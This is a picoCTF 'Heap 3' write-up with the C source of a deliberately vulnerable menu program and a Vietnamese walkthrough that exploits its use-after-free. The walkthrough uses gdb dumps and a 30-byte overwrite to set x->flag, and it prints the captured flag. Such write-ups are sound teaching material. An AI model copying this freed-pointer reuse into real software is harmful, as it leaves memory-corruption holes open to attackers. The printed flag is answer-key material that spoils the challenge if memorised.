## Heap 3

This program mishandles memory. Can you exploit it to get the flag?

Download the binary here.

Download the source here.

Additional details will be available after launching your challenge instance.

### Source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FLAGSIZE_MAX 64

// Create struct
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;

int num_allocs;
object *x;

void check_win() {
  if(!strcmp(x->flag, "pico")) {
    printf("YOU WIN!!11!!\n");

    // Print flag
    char buf[FLAGSIZE_MAX];
    FILE *fd = fopen("flag.txt", "r");
    fgets(buf, FLAGSIZE_MAX, fd);
    printf("%s\n", buf);
    fflush(stdout);

    exit(0);

  } else {
    printf("No flage for u :(\n");
    fflush(stdout);
  }
  // Call function in struct
}

void print_menu() {
    printf("\n1. Print Heap\n2. Allocate object\n3. Print x->flag\n4. Check for win\n5. Free x\n6. "
           "Exit\n\nEnter your choice: ");
    fflush(stdout);
}

// Create a struct
void init() {

    printf("\nfreed but still in use\nnow memory untracked\ndo you smell the bug?\n");
    fflush(stdout);

    x = malloc(sizeof(object));
    strncpy(x->flag, "bico", 5);
}

void alloc_object() {
    printf("Size of object allocation: ");
    fflush(stdout);
    int size = 0;   
    scanf("%d", &size);
    char* alloc = malloc(size);
    printf("Data for flag: ");
    fflush(stdout);
    scanf("%s", alloc);
}

void free_memory() {
    free(x);
}

    void print_heap() {
        printf("[*]   Address   ->   Value   \n");
        printf("+-------------+-----------+\n");
        printf("[*]   %p  ->   %s\n", x->flag, x->flag);
        printf("+-------------+-----------+\n");
        fflush(stdout);
    }

int main(void) {

    // Setup
    init();

    int choice;

    while (1) {
        print_menu();
	if (scanf("%d", &choice) != 1) exit(0);

        switch (choice) {
        case 1:
            // print heap
            print_heap();
            break;
        case 2:
            alloc_object();
            break;
        case 3:
            // print x
            printf("\n\nx = %s\n\n", x->flag);
            fflush(stdout);
            break;
        case 4:
            // Check for win condition
            check_win();
            break;
        case 5:
            free_memory();
            break;
        case 6:
            // exit
            return 0;
        default:
            printf("Invalid choice\n");
            fflush(stdout);
        }
    }
}
```

## Solution
* Challenge này có đề cập đến việc Use-After-Free, đây là một khái niệm liên quan đến việc sử dụng lại bộ nhớ mà đã được giải phóng, nó sẽ dẫn đến vấn đề ghi dữ liệu ở vị trí vừa được giải phóng.

* Hướng giải quyết: Free(x) sau đó sử dụng lại x để có thể ghi đè lên vùng vừa được giải phóng.
* Chạy chương trình và in ra địa chỉ của `x->flag`, nó có địa chỉ là `0x4056ce` và giá trị là `bico`.
* Mình thử dùng gdb để check các vùng nhớ quanh `x->flag`, thu được:
```
gef➤  x/20x 0x4056ae
0x4056ae:       0x00000000      0x00000000      0x00000000      0x00000000
0x4056be:       0x00000000      0x00000000      0x00000000      0x00000000
0x4056ce:       0x6f636962      0x00000000      0x04110000      0x00000000
0x4056de:       0x0a330000      0x00000000      0x00000000      0x00000000
0x4056ee:       0x00000000      0x00000000      0x00000000      0x00000000
```

* Chọn 2 và nhập vào một biến `aaaaaaaaaa` để xem nó được ghi ở đâu xung quanh vùng nhớ này.
```
gef➤  x/20x 0x4056ae
0x4056ae:       0x00000000      0x00000000      0x00000000      0x00000000
0x4056be:       0x00000000      0x00000000      0x00000000      0x00000000
0x4056ce:       0x6f636962      0x00000000      0x04110000      0x00000000
0x4056de:       0x61610000      0x61616161      0x61616161      0x0000000a
0x4056ee:       0x00000000      0x00000000      0x00000000      0x00000000
```
* Ta có thể thấy được rằng nó được ghi sau `x->flag` nên không thể ghi đè theo cách thông thường.
* Bây giờ, giải phóng bộ nhớ và nhập lại `aaaaaaaaaaaaaaaaaaaaaaaaa` thì nhận thấy nó đã được ghi ở một vùng nhớ khác(không xác định). Tuy nhiên lần này nó đã đè lên cả `x->flag`.
```
gef➤  x/20x 0x4056ae
0x4056ae:       0x61610000      0x61616161      0x61616161      0x61616161
0x4056be:       0x61616161      0x61616161      0x61616161      0x61616161
0x4056ce:       0x61616161      0x00000000      0x04110000      0x00000000
```
*  Theo như trạng thái vùng nhớ ở dưới thì ta cần 30 bytes để đè đến `0x4056ce` -> nhập chuỗi `aaaaaaaaaaaaaaaaaaaaaaaaaaaaaapico` và thu được flag `picoCTF{now_thats_free_real_estate_a11cf359}`